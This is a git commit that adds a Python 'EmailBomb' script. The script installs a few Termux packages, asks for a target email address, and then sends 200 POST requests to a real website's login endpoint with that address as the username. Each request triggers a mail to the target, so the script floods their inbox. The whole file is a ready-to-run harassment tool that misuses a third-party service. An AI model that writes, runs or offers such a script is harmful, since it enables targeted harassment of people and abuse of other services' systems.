746805b2196e89181df46086df97dda429d44192
Shahmir Riddo <78295593+GanjaBaba-svg@users.noreply.github.com>
2021-11-09 19:02:18 +0600

    cgz.py

---
+++ cgz.py
@@ -0,0 +1,87 @@
+import sys
+import requests
+import time
+import os
+ 
+r="\033[1;91m"
+g="\033[1;92m"
+y="\033[1;93m"
+b="\033[1;94m"
+p="\033[1;95m"
+c="\033[1;96m"
+ig="\033[0;102m"
+off="\033[0m"
+print(g)
+os.system('clear')
+print('Please Wait. Pkg Chacking.....!!')
+time.sleep(0)
+print('')
+os.system('pip install requests')
+os.system('clear')
+print('Please Wait. Pkg Chacking.....!!')
+time.sleep(1)
+print('')
+os.system('pkg install ruby')
+os.system('clear')
+print('Please Wait. Pkg Chacking.....!!')
+print('')
+time.sleep(1)
+os.system('pkg install nano')
+os.system('clear')
+print('Please Wait. Pkg Chacking.....!!')
+print('')
+time.sleep(1)
+os.system('pkg install figlet')
+os.system('clear')
+print('Please Wait. Pkg Chacking.....!!')
+print('')
+time.sleep(1)
+os.system('gem install lolcat')
+os.system('clear')
+print('Please Wait. Pkg Chacking.....!!')
+print('')
+time.sleep(1)
+os.system('clear')
+print('All pkg install Done..........!!')
+time.sleep(2)
+from time import sleep
+from requests.structures import CaseInsensitiveDict
+os.system('clear')
+ 
+print(g+'\tShahmir '+r+'Riddo '+y+'^'+c+'Than '+p+'|')
+print('')
+os.system('figlet -f small EmailBomb |lolcat')
+print(g+'==========='+y+'ᴀᴜᴛʜᴏʀ~ᴍᴏʜᴀᴍᴍᴀᴅ ᴀʟᴀᴍɪɴ'+g+'===========')
+a=str(input(g+'\n\tEnter Email :'+p+' '))
+url = "https://m.cricbuzz.com/cbplus/auth/user/login"
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/json"
+data = '{"username":"'+a+'","provider":"Email"}'
+os.system('clear')
+print(y+'\n\nEmail requests sending to'+p+' '+a+'')
+time.sleep(0.01)
+print('\nThreat : 5*5*20=500')
+for i in range(10):
+	resp = requests.post(url, headers=headers, data=data)
+	resp2 = requests.post(url, headers=headers, data=data)
+	resp3 = requests.post(url, headers=headers, data=data)
+	resp4 = requests.post(url, headers=headers, data=data)
+	resp5 = requests.post(url, headers=headers, data=data)
+	resp6 = requests.post(url, headers=headers, data=data)
+	resp7 = requests.post(url, headers=headers, data=data)
+	resp8 = requests.post(url, headers=headers, data=data)
+	resp9 = requests.post(url, headers=headers, data=data)
+	resp10 = requests.post(url, headers=headers, data=data)
+	resp11 = requests.post(url, headers=headers, data=data)
+	resp12 = requests.post(url, headers=headers, data=data)
+	resp13 = requests.post(url, headers=headers, data=data)
+	resp14 = requests.post(url, headers=headers, data=data)
+	resp15 = requests.post(url, headers=headers, data=data)
+	resp16 = requests.post(url, headers=headers, data=data)
+	resp17 = requests.post(url, headers=headers, data=data)
+	resp18 = requests.post(url, headers=headers, data=data)
+	resp19 = requests.post(url, headers=headers, data=data)
+	resp20 = requests.post(url, headers=headers, data=data)
+	print('\n\tEmail Request Sent')
+	
+ 
